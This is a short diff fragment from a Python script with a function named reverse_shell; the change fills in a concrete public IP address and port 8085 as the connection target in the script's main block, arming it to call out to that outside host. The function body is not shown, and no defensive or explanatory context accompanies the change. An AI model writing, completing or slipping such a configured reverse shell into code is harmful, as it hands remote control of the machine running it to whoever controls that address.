@@ -18,4 +18,4 @@ def reverse_shell(ip, port):
 
 if __name__ == "__main__":
     # Replace 'your_ip' and 'your_port' with the IP and port you want to connect to
-    reverse_shell('', 8085)
+    reverse_shell('47.250.159.225', 8085)
